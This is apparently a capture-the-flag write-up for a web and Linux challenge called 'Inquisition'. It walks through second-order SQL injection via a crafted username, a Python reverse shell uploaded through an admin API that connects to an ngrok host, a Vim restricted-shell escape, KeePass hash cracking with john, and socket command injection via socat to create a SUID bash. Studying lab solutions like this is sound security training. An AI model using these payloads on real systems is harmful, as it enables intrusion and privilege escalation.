
# Inquisition, Hard

# Description: 

`As the veil between dreams and nightmare thins, apocalypse becomes a certainty.`

# Deployment: 

Image build:

`docker build -t inquisition .`

Run the container:

`docker run -p 5555:80 6001:22 inquisition`

# Write up

We've got authorization and registration forms:


<img width="1624" alt="image" src="https://github.com/user-attachments/assets/20ceffe7-469c-4f9d-b8bb-a83786ef3a1f">

Let's register a new user and authorize using its credentials:


<img width="1316" alt="image" src="https://github.com/user-attachments/assets/7f69df44-7409-49f9-bdf3-acdd58039286">

Not much we can do – change password and logout, let's try using first option: 


<img width="1205" alt="image" src="https://github.com/user-attachments/assets/6f9de142-4052-4b0c-8617-8901c0dd87ec">

Logging in with the new password works as well. 

Welcome screen says "Welcome home, user!" – is there any chance we could log in as an admin?

Login form itself is not vulnerable to any bruteforce or SQL-injection attacks.

Considering a password change function, there's probably a database behind our application that allows us to update current user's password using a SQL query, which could be vulnerable to **second-order SQL-injection**

Let's register a new user with the name of `admin' -- -` and set its password then just login


<img width="1475" alt="image" src="https://github.com/user-attachments/assets/9c9c71e6-c087-4459-be53-0f70001cc790">

Now try to change the fake admin's password to, for example, 'admin'

Try to log in using credentials `admin:admin` and it leads us to the admin page: 


<img width="1040" alt="image" src="https://github.com/user-attachments/assets/dfa6e314-0e14-4a57-b4ca-9369938a4e89">

Here we have some API instructions: 


<img width="1017" alt="image" src="https://github.com/user-attachments/assets/486b1298-b32e-4471-8970-c73cb9ea6146">


Exploring them, we find two interesting API's that could be used to gain RCE:


![telegram-cloud-photo-size-4-5964352502373659856-w](https://github.com/user-attachments/assets/a2942bde-107a-41d0-96c7-775a52ada323)


First API fetches the content from the presented page and saves it to the specified file, the second API runs module from `./modules` directory.

Second API runs the script from the `modules` directory.

Let's create a reverse-shell script using python:

```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("0.tcp.jp.ngrok.io",10336));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("/bin/bash")
```

Then upload it using first API:

![telegram-cloud-photo-size-4-5964422776628557185-w](https://github.com/user-attachments/assets/92f67ec1-40c6-42ad-af23-fdf958cf37af)

And run using second API:

![telegram-cloud-photo-size-4-5964036740673025327-w](https://github.com/user-attachments/assets/7f892fe5-6043-4b19-817f-9be3431c7888)

We have successfully gained RCE using API's, but we find ourselves in a restricted shell enviroment, which is not good at all for our goals: 


<img width="613" alt="image" src="https://github.com/user-attachments/assets/4499fccd-aae6-41d1-aee3-cfe6da6bcbbc">

We're lucky to have an access to the Vim binary though, which allows us to break out of the restricted shell:

```
:set shell=/bin/sh
:shell
```

We're now in a much better enviroment, lets export default PATH variable to access all the binaries

<img width="771" alt="image" src="https://github.com/user-attachments/assets/6480b7ed-4a7b-405c-9cb5-71f0546f387d">


In a /home directory we find a Keepass2 database, let's crack it using john or hashcat:

```

┌──(kali㉿kali)-[~/Desktop]
└─$ keepass2john Database.kdbx > brute && john brute
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
nothing          (Database)     
1g 0:00:00:02 DONE 2/3 (2024-08-24 01:46) 0.3610g/s 449.8p/s 449.8c/s 449.8C/s frodo..barbara
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Inside the database we find an attachment called "hashes", let's try to crack them:

<img width="1053" alt="image" src="https://github.com/user-attachments/assets/1d24713a-d4d7-454f-b316-5c1c7358b65c">


We gain two possible credential pairs – `darel:weakness` and `darel:goodpassword`, the last one turns to be valid for ssh:

`ssh darel@hostname -p port`

Exploring the machine, we find a listening port using `netstat -l`


<img width="884" alt="image" src="https://github.com/user-attachments/assets/1fe58c21-478f-4e48-9f2f-9533fa40e915">


Using **socket command injection**, let's copy bash binary, set suid and execution rights on it:

`echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/bin/socket.s`

PWNed!

<img width="972" alt="image" src="https://github.com/user-attachments/assets/3da66c4a-153e-4ed8-b4e2-2794b64580c8">

## Flag: tqlCTF{1nQu1s1t1on_l34ds_to_w0rld5_d3s7Ruc710n}
